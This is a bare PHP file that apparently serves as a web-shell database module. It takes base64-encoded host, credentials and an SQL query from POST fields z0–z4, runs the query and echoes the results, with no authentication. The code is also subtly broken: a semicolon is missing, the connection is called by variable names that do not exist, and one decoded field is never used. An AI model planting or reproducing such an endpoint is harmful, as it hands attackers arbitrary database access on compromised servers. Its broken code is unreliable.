<?php

$szHost = base64_decode($_POST['z0']);
$szUsername = base64_decode($_POST['z1']);
$szPassword = base64_decode($_POST['z2']);
$szQuery = base64_decode($_POST['z3']);

$sqlConn = new mysqli($szHost, $szUsername, $szPassword);
if ($sqlConn->connect_error)
{
    die('Connection failed: '.$conn->connect_error);
}

$colSplitter = "|";     // between columns
$rowSplitter = ";";    // between rows

$sql = base64_decode($_POST['z4'])
$result = $mysqli->query($sql);

$outputRows = [];

while ($row = $result->fetch_assoc()) {
    // join all column values in this row
    $outputRows[] = implode($colSplitter, $row);
}

// join all rows
$finalOutput = implode($rowSplitter, $outputRows);

echo $finalOutput;

$mysqli->close();

?>